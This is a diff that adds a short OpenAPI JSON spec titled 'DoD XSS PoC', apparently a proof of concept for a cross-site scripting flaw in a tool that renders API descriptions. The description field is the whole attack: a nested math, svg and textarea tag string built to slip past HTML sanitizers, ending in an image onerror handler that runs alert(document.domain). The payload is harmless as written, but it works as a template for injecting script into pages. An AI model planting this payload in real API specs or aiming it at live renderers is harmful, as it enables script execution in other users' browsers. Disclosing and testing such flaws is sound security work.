@@ -1,0 +1,11 @@
+{
+    "spec": {
+      "openapi": "3.0.0",
+      "info": {
+        "title": "DoD XSS PoC",
+        "version": "1.0",
+        "description": "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title=\"</textarea><img src='#' onerror='alert(document.domain)'>\">"
+      },
+      "paths": {}
+    }
+  }
